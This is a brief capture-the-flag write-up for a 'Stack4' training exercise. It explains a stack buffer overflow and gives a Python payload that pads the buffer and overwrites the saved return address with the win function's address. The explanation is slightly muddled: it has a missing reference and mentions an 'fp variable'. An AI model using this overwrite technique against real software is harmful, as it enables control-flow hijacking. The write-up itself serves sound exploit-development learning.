# Stack4
This is the same as, but we manipulate the esp/ebp so that we get to where we want to.
To successfully exploit this program you would need to know that there is extra space between the ebp and esp on the stack outside of the stackframe.
In this case there was an extra 8 bytes before we hit the esp and ebp, I can currently only think of trial and error to figure this out.

```
x win
```
and we get 0x80483f4 as the function address. Our goal would be to overwrite the buffer so that the fp variable is equal to this.

The solution input is:

```python
import struct
buff = "A"*72
buff1 = "AAAA"
buff2 = struct.pack("I", 0x80483f4)
print(buff+buff1+buff2)
```
Run 
```
python stack.py > exp
```

Feed it into GDB using r < /tmp/exp
